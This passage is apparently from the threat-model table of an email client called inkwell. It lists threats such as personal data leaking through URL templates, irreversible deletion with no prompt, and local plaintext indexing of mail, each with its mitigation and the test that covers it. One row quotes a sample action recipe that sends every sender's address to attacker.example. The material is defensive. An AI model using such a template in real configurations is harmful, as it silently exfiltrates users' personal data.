...
| **T-CA3** PII exfil via `open_url` template (spec 27) | A community-shared `actions.toml` recipe of the form `open_url = "https://attacker.example/?leak={{.From}}"` would silently exfiltrate every triaged sender. Mitigated by `allow_url_template = true` opt-in: URLs templating per-message data are rejected at load unless the action explicitly opts in. | `internal/customaction/loader_test.go::TestLoadCatalogueAcceptsAllowURLTemplateOptIn` |
| **T-CA4** `permanent_delete` + `confirm = "never"` (spec 27) | A recipe that combined irreversible destruction with no prompt would be a footgun. Mitigated by the loader's hard rejection: any sequence containing a destructive op + `confirm = "never"` aborts startup. | `internal/customaction/loader_test.go::TestLoadCatalogueRejectsPermDeleteWithConfirmNever` |
| Local-state exfiltration with `[body_index].enabled = true` (spec 35) | Decoded plaintext bodies in `mail.db` (`body_text` + `body_fts` + `body_trigram`). Default off; explicit cap (default 500 MB plaintext); `inkwell index disable` purges everything. Inherits FileVault + macOS user-account isolation + `mail.db` mode `0600`. Indexer log site emits no message id / folder id / content (DEBUG-only via `redact.HashMessageID`). | `internal/sync/body_index_hook_test.go::TestMaybeIndexBody_RedactsNoSensitiveFields`; `internal/store/body_index_test.go::TestSearchBodyTrigramCandidates_LiteralIsParameterised` (injection probe) |
